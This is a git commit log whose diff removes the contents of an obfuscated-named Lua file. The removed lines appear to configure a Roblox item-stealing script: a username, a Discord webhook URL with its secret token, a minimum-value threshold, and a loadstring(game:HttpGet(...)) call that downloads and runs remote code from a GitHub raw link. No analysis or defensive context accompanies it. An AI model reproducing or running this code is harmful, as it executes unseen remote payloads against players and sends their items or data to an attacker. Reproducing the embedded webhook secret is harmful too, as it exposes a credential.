b7b5d7264bb4b148a2e3142963202f5552ca5fda
adustdustcambek <adustdustcambek@gmail.com>
2026-04-20 04:17:40 +0300

    Update obf_8WNXrI2ZdUc8l61jBH4pLp5vszu40uxJJkYgLx5GlMWKcS4YiV94Tk1tr2CQfJYe.lua

--- obf_8WNXrI2ZdUc8l61jBH4pLp5vszu40uxJJkYgLx5GlMWKcS4YiV94Tk1tr2CQfJYe.lua
+++ obf_8WNXrI2ZdUc8l61jBH4pLp5vszu40uxJJkYgLx5GlMWKcS4YiV94Tk1tr2CQfJYe.lua
@@ -1,15 +1,1 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
-]]--
-
-Username = "jadsa121";
-Webhook = "https://discord.com/api/webhooks/1495574107083772026/lP_43vu3ze3PUecIUK9U7zAw8CSM1A1TXt8RfJQ5QIe3-ouzJic00UlW_cRFkSGKGkhL";
-MinimumRAP = 1563262 - 1063262;
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KSFoster/VANHOFFHub/refs/heads/main/Lua"))();
